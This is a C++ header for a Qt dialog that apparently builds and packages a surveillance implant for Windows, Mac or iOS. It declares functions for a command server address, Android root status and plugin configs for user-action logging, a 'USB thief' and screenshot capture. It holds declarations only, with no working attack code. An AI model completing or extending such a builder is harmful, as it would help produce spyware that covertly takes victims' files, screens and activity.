/*!
	Description : 生成目标端
	Author		: Ruining Song
	Date		: 2013.12.5
	Remark		:
			
			主要功能 : 生成配置文件、打包
*/

#ifndef GENERATEDLG_H
#define GENERATEDLG_H

#include <QtGui>
#include "ui_generatedlg.h"
#include <windows.h>

#include "target.h"

#include "include/T5UserAction.h"
#include "include/T5UsbConfig.h"
#include "include/T5Screen.h"

#include "waitdlg.h"

typedef struct _PLUGIN_ALIAS
{
	DWORD dwPluginNumber;			// 1、2、3、4
	WCHAR wzPluginName[MAX_PATH];	// XXX.dat
}PLUGIN_ALIAS, *PPLUGIN_ALIAS;

class GenerateThread;
class WaitDlg;

class GenerateDlg : public QDialog
{
	Q_OBJECT

public:

	enum PLATFORM{SYSTEM_WINDOWS=0, SYSTEM_MAC, SYSTEM_IOS, };

	GenerateDlg(QWidget *parent = 0);
	~GenerateDlg();

private slots:

	// 生成目标
	void GenerateTarget();

	// 平台变化
	void PlatformChanged(QListWidgetItem* item);

	// 生成目标完成
	void GenerateFinished();

	// 域名/ip 的切换
	void ServerTypeChanged_1(int index);
	void ServerTypeChanged_2(int index);

	// 域名解析
	void GetIP();

	// 目标是否已被 root ( android device )
	void RootStatusChanged();

	// 环境变化 local/remote
	void EnvironmentChanged();

private:

	void InitCustomGui();

	// 生成 dtl.dat
	bool GenerateMainCfg();

	// 生成 glp.uin
	bool GeneratePlgCfg();

	// 生成 plugin.dat
	bool GeneratePlgNameCfg();

	// 获取用户行为配置信息
	bool GetUserActionCfgInfo(PUSER_ACT_CFG& lpUserActCfgData);

	// 获取 usb 配置信息
	bool GetUsbCfgInfo(PUSB_THIEF_CONFIG& lpUsbThiefCfgData);

	// 获取截屏配置信息
	bool GetScreenshotCfgInfo(PCAPTURE_CONFIG& lpCaptureCfgData);

	// 获取指定系统对应的 PlgCxtVect
	PPLUGIN_CXT* GetPlgCxtVect();

	// Simple factory, return generate thread.
	GenerateThread* CreateGenerateThread(std::wstring path);

	void UpdatePluginEnabled();

	inline const bool* GetPluginEnabledLayout()
	{
		return m_plgEnabled;
	}

private:
	Ui::GenerateDlg ui;
	std::wstring m_curSystem;

	QWidget* tab2;
	GenerateThread* m_genThread;
	WaitDlg* m_waitDlg;
	QValidator* m_ipMask;

	// 启用的插件
	bool m_plgEnabled[MAX_PLG_COUNT];
};

#endif // GENERATEDLG_H
